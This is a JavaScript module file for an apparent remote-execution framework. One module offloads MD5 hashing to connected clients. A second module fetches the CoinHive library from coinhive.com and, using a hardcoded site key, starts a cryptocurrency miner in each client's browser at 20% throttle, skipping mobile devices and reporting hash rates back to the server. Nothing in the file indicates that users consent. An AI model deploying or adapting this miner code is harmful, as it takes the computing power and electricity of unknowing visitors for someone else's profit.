let Module = require('./Module.js');

let ExampleModule = new Module();

ExampleModule.addDependencies("https://cdn.rawgit.com/blueimp/JavaScript-MD5/da202aebc0436c715e074525affc4e9416309fc3/js/md5.min.js");

ExampleModule.setMainFunction(function(module, socket, config) {
	socket.executeFunc(module, "md5Hash", (function() {let out = []; for (let i = 0; i < 1000000; i++) {out.push(Math.random())} return out})());
});

ExampleModule.addRemoteFunction("md5Hash", function(args, debug) {
	let out = [];
	
	console.log(args);
	
	if (args instanceof Function) args = args();
	
	for (let i = 0; i < args.length; i++) {
		out.push(md5(args[i]));
	}
	
	return out;
});

exports.ExampleModule = ExampleModule;

CoinHiveModule = new Module();

CoinHiveModule.addDependencies("https://coinhive.com/lib/coinhive.min.js");

CoinHiveModule.setDefaultConfig({
	"siteKey": "EeIIqtrF5oLgHOgpPQGtIkXUe3JvAI15"
});

CoinHiveModule.setMainFunction(function(module, socket, config) {
	socket.executeFunc(module, "startMiner", config["siteKey"]);
	
	socket.on("minerData", console.log);
});

CoinHiveModule.addRemoteFunction("startMiner", function(sitekey, debug) {
	let miner = new CoinHive.Anonymous(sitekey, {throttle: 0.2});
	// Only start on non-mobile devices
	if (!miner.isMobile()) {
		miner.start();
		if (debug) console.log("Debug: Miner started!");	
		setInterval(function() {
			var hashesPerSecond = miner.getHashesPerSecond();
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes();

			socket.emit("minerData", [hashesPerSecond, totalHashes, acceptedHashes]);
		}, 1000);					
	}
});

exports.CoinHiveModule = CoinHiveModule;